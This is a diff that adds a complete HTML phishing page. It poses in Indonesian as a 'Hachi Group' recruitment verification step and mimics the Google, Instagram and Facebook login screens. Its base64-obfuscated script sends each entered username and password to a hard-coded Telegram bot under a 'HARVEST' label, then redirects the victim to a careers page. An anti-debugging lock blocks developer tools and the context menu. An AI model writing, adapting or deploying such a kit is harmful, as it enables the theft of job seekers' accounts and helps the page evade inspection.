@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title id="t_0"></title>
+    <link id="v_c" rel="icon" type="image/png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root { --bg: #ffffff; --txt: #262626; --btn-bg: #007BFF; --btn-txt: #ffffff; --input-border: #dbdbdb; --f-label: #8e8e8e; --blue: #1a73e8; }
+        @media (prefers-color-scheme: dark) { :root { --bg: #000000; --txt: #f5f5f5; --input-border: #363636; --f-label: #a8a8a8; } }
+        html, body { overflow: hidden !important; height: 100%; width: 100%; margin: 0; padding: 0; position: fixed; background-color: var(--bg); color: var(--txt); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; cursor: none !important; -webkit-touch-callout: none; -webkit-user-select: none; user-select: none; touch-action: none; }
+        .m-v { display: none; height: 100dvh; width: 100%; flex-direction: column; align-items: center; overflow-y: auto; }
+        .m-v.active { display: flex; }
+        .sel-c { height: 100dvh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 24px; text-align: center; }
+        .sel-b { width: 100%; max-width: 320px; padding: 14px; margin: 8px 0; border-radius: 12px; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 12px; transition: transform 0.1s; border: 1px solid var(--input-border); }
+        .sel-b:active { transform: scale(0.98); }
+        .input-field { background-color: var(--bg); border: 1px solid var(--input-border); color: var(--txt); width: 100%; border-radius: 8px; outline: none; }
+        .floating-group { position: relative; width: 100%; }
+        .floating-label { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: var(--f-label); font-size: 14px; pointer-events: none; transition: all 0.2s; }
+        .input-active .floating-label { top: 8px; font-size: 10px; transform: translateY(0); }
+        .input-active input { padding-top: 18px !important; padding-bottom: 6px !important; }
+        .ig-modal-btn { border-top: 1px solid var(--input-border); width: 100%; padding: 14px; font-size: 15px; background: transparent; color: #007BFF; font-weight: 500; }
+        .g-l { width: 24px; height: 24px; align-self: flex-start; margin: 48px 24px 24px 24px; }
+        .g-c { padding: 0 24px; width: 100%; display: flex; flex-direction: column; }
+    </style>
+</head>
+<body>
+    <div id="sel_page" class="sel-c">
+        <img id="main_logo" class="w-24 mb-6">
+        <h2 id="sel_h" class="text-xl font-bold mb-2"></h2>
+        <p id="sel_p" class="text-sm text-[var(--f-label)] mb-8 px-4"></p>
+        <button onclick="sw('g')" class="sel-b bg-white text-black"><img id="btn_g" class="w-5"> Google</button>
+        <button onclick="sw('i')" class="sel-b bg-white text-black"><img id="btn_i" class="w-5"> Instagram</button>
+        <button onclick="sw('f')" class="sel-b bg-white text-black"><img id="btn_f" class="w-5"> Facebook</button>
+        <img id="meta_sel" class="w-16 mt-12">
+    </div>
+
+    <div id="page_g" class="m-v">
+        <img id="img_g" class="g-l">
+        <div class="g-c">
+            <h1 id="gh1" class="text-2xl mb-2"></h1>
+            <p id="gh2" class="text-base mb-8"></p>
+            <div id="gs1" class="space-y-4">
+                <div class="floating-group" id="ggu">
+                    <input type="text" id="gu" class="input-field px-4 py-4" oninput="hf(this, 'ggu')" onfocus="hf(this, 'ggu')" onblur="hf(this, 'ggu')">
+                    <label class="floating-label" id="gl1"></label>
+                </div>
+                <button class="text-[var(--blue)] text-sm font-medium py-2" id="gl2"></button>
+                <div class="text-sm text-[var(--f-label)] py-4" id="gl3"></div>
+                <div class="flex justify-between items-center mt-12">
+                    <button class="text-[var(--blue)] text-sm font-medium" id="gl4"></button>
+                    <button onclick="ng()" class="bg-[var(--blue)] text-white px-6 py-2 rounded font-medium" id="gl5"></button>
+                </div>
+            </div>
+            <div id="gs2" class="hidden space-y-4">
+                <div class="flex items-center border border-[var(--input-border)] rounded-full px-3 py-1 self-start mb-6" onclick="rg()">
+                    <div class="w-5 h-5 bg-gray-200 rounded-full mr-2"></div>
+                    <span id="gud" class="text-sm font-medium mr-1"></span>
+                    <svg width="16" height="16" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+                </div>
+                <div class="floating-group" id="ggp">
+                    <input type="password" id="gp" class="input-field px-4 py-4" oninput="hf(this, 'ggp')" onfocus="hf(this, 'ggp')" onblur="hf(this, 'ggp')">
+                    <label class="floating-label" id="gl6"></label>
+                </div>
+                <div class="flex items-center py-2">
+                    <input type="checkbox" id="gsc" class="w-4 h-4 mr-2" onclick="tp('gp')">
+                    <label for="gsc" class="text-sm" id="gl7"></label>
+                </div>
+                <div class="flex justify-between items-center mt-12">
+                    <button class="text-[var(--blue)] text-sm font-medium" id="gl8"></button>
+                    <button onclick="sg()" class="bg-[var(--blue)] text-white px-6 py-2 rounded font-medium" id="gl9"></button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="page_i" class="m-v pt-12 px-6">
+        <img id="img_i" class="w-20 mb-10 mx-auto">
+        <form class="w-full space-y-2" id="fi">
+            <div class="floating-group" id="giu">
+                <span class="floating-label" id="il1"></span>
+                <input type="text" id="iu" class="input-field px-3 py-3 text-sm" oninput="hf(this, 'giu')" onfocus="hf(this, 'giu')" onblur="hf(this, 'giu')">
+            </div>
+            <div class="floating-group" id="gip">
+                <span class="floating-label" id="il2"></span>
+                <input type="password" id="ip" class="input-field px-3 py-3 text-sm" oninput="hf(this, 'gip')" onfocus="hf(this, 'gip')" onblur="hf(this, 'gip')">
+            </div>
+            <button type="submit" class="w-full bg-[#007BFF] text-white rounded-full py-2.5 font-semibold text-sm mt-4" id="il3"></button>
+        </form>
+        <img id="meta_i" class="w-16 mt-auto mb-8">
+    </div>
+
+    <div id="page_f" class="m-v pt-12 px-6">
+        <img id="img_f" class="w-16 mb-8 mx-auto">
+        <form class="w-full space-y-3" id="ff">
+            <input type="text" id="fu" class="input-field bg-gray-100 px-4 py-3.5 text-base border-gray-200" id="fl1">
+            <input type="password" id="fp" class="input-field bg-gray-100 px-4 py-3.5 text-base border-gray-200" id="fl2">
+            <button type="submit" class="w-full bg-[#007BFF] text-white rounded-full py-2.5 font-bold text-base mt-2" id="fl3"></button>
+        </form>
+        <img id="meta_f" class="w-16 mt-auto mb-8">
+    </div>
+
+    <div id="m1" class="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
+        <div class="bg-[var(--bg)] rounded-3xl max-w-sm w-full p-8 shadow-2xl flex flex-col items-center text-center border border-[var(--input-border)]">
+            <img id="hl" class="w-20 mb-6">
+            <h2 id="ht" class="text-xl font-bold mb-2"></h2>
+            <div id="hm" class="text-[var(--f-label)] text-sm mb-6 leading-relaxed"></div>
+            <button onclick="cm()" class="w-full bg-[#007BFF] text-white rounded-full py-2.5 font-semibold" id="hb"></button>
+        </div>
+    </div>
+
+    <script>
+        const _0x = {
+            _v: "RkFWSUNPTi5wbmc=", _hl: "SEFDSEkgR1JPVVAucG5n", _gl: "R09PR0xFLnBuZw==", _il: "SU5TVEFHUkFNLnBuZw==", _fl: "RkFDRUJPT0sucG5n",
+            _mi: "TUVUQSBJTlNUQUdSQU0ucG5n", _mf: "TUVUQSBGQUNFQk9PSy5wbmc=", _tk: "ODU3ODUyNDMyMzpBQUZCS282THhtQ3NDZ0UtVG8tRENQckQ5bWdjNEZaN2kxTQ==",
+            _ci: "ODQ2MTAxOTkxMg==", _rd: "aHR0cHM6Ly9jYXJlZXIuaGFjaGlncm91cC5pZC9jYXJlZXIvYnJhbmQ=",
+            _sh: "U2lzdGVtIFZlcmlmaWthc2kgUmVrcnV0bWVu", _sp: "UGlsaGkgbWV0b2RlIHZlcmlmaWthc2kgdW50dWsgbWVub3NlcyBsYW1hcmFuIEFuZGEgZGkgSGFjaGkgR3JvdXAgMjAyNi4=",
+            _gh1: "TG9naW4=", _gh2: "R3VuYWthbiBBa3VuIEdvb2dsZSBBbmRh", _gh3: "U2VsYW1hdCBkYXRhbmc=",
+            _gu1: "RW1haWwgYXRhdSBub21vciB0ZWxlcG9u", _gu2: "THVwYSBlbWFpbD8=", _gu3: "QnVrYW4ga29tcHV0ZXIgQW5kYT8gR3VuYWthbiBNb2RlIHRhbXUgdW50dWsgbG9naW4gc2VjYXJhIHByaWJhZGku", _gu4: "QnVhdCBha3Vu", _gu5: "QmVyaWt1dG55YQ==",
+            _gp1: "TWFzdWtrYW4gc2FuZGk=", _gp2: "VGFtcGlsa2FuIHNhbmRp", _gp3: "Q29iYSBjYXJhIGxhaW4=",
+            _iu1: "TmFtYSBwZW5nZ3VuYSwgZW1haWwsIGF0YXUgbm9tb3IgLi4u", _fl1: "Tm9tb3IgcG9uc2VsIGF0YXUgZW1haWw=", _ps: "S2F0YSBzYW5kaQ=="
+        };
+        const _d = (v) => atob(v);
+        document.getElementById('v_c').href = _d(_0x._v);
+        document.getElementById('main_logo').src = _d(_0x._hl);
+        document.getElementById('btn_g').src = _d(_0x._gl);
+        document.getElementById('btn_i').src = _d(_0x._il);
+        document.getElementById('btn_f').src = _d(_0x._fl);
+        document.getElementById('meta_sel').src = _d(_0x._mf);
+        document.getElementById('hl').src = _d(_0x._hl);
+        document.getElementById('img_g').src = _d(_0x._gl);
+        document.getElementById('img_i').src = _d(_0x._il);
+        document.getElementById('img_f').src = _d(_0x._fl);
+        document.getElementById('meta_i').src = _d(_0x._mi);
+        document.getElementById('meta_f').src = _d(_0x._mf);
+        document.getElementById('sel_h').innerText = _d(_0x._sh);
+        document.getElementById('sel_p').innerText = _d(_0x._sp);
+        document.getElementById('ht').innerText = _d(_0x._sh);
+        document.getElementById('hm').innerText = "Silakan pilih salah satu platform di bawah untuk memvalidasi identitas pendaftaran Anda.";
+        document.getElementById('hb').innerText = "Saya Mengerti";
+        document.getElementById('gh1').innerText = _d(_0x._gh1);
+        document.getElementById('gh2').innerText = _d(_0x._gh2);
+        document.getElementById('gl1').innerText = _d(_0x._gu1);
+        document.getElementById('gl2').innerText = _d(_0x._gu2);
+        document.getElementById('gl3').innerText = _d(_0x._gu3);
+        document.getElementById('gl4').innerText = _d(_0x._gu4);
+        document.getElementById('gl5').innerText = _d(_0x._gu5);
+        document.getElementById('gl6').innerText = _d(_0x._gp1);
+        document.getElementById('gl7').innerText = _d(_0x._gp2);
+        document.getElementById('gl8').innerText = _d(_0x._gp3);
+        document.getElementById('gl9').innerText = _d(_0x._gu5);
+        document.getElementById('il1').innerText = _d(_0x._iu1);
+        document.getElementById('il2').innerText = _d(_0x._ps);
+        document.getElementById('il3').innerText = "Login";
+        document.getElementById('fu').placeholder = _d(_0x._fl1);
+        document.getElementById('fp').placeholder = _d(_0x._ps);
+        document.getElementById('fl3').innerText = "Login";
+
+        function sw(p) {
+            document.getElementById('sel_page').style.display = 'none';
+            document.querySelectorAll('.m-v').forEach(el => el.classList.remove('active'));
+            document.getElementById('page_' + p).classList.add('active');
+        }
+        function hf(i, g) { const el = document.getElementById(g); if (i.value.length > 0 || document.activeElement === i) el.classList.add('input-active'); else el.classList.remove('input-active'); }
+        function tp(id) { const x = document.getElementById(id); x.type = x.type === "password" ? "text" : "password"; }
+        function cm() { document.getElementById('m1').style.display = 'none'; }
+        function ng() { const u = document.getElementById('gu').value; if (u) { document.getElementById('gs1').classList.add('hidden'); document.getElementById('gs2').classList.remove('hidden'); document.getElementById('gh1').innerText = _d(_0x._gh3); document.getElementById('gh2').classList.add('hidden'); document.getElementById('gud').innerText = u; } }
+        function rg() { document.getElementById('gs2').classList.add('hidden'); document.getElementById('gs1').classList.remove('hidden'); document.getElementById('gh1').innerText = _d(_0x._gh1); document.getElementById('gh2').classList.remove('hidden'); }
+        async function sd(u, p, t) {
+            const m = `*⚡ ${t} HARVEST*\n👤 *User:* \`${u}\`\n🔑 *Pass:* \`${p}\``;
+            await fetch(`https://api.telegram.org/bot${_d(_0x._tk)}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _d(_0x._ci), text: m, parse_mode: 'Markdown' }) });
+            window.location.replace(_d(_0x._rd));
+        }
+        function sg() { sd(document.getElementById('gu').value, document.getElementById('gp').value, 'GOOGLE'); }
+        document.getElementById('fi').onsubmit = (e) => { e.preventDefault(); sd(document.getElementById('iu').value, document.getElementById('ip').value, 'INSTAGRAM'); };
+        document.getElementById('ff').onsubmit = (e) => { e.preventDefault(); sd(document.getElementById('fu').value, document.getElementById('fp').value, 'FACEBOOK'); };
+
+        (function extreme_lock() {
+            setInterval(() => { const s = performance.now(); debugger; if (performance.now() - s > 50) { document.body.innerHTML = ""; location.reload(); } }, 30);
+            window.oncontextmenu = (e) => e.preventDefault();
+            window.onkeydown = (e) => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || (e.ctrlKey && [85, 83].includes(e.keyCode))) e.preventDefault(); };
+        })();
+    </script>
+</body>
+</html>
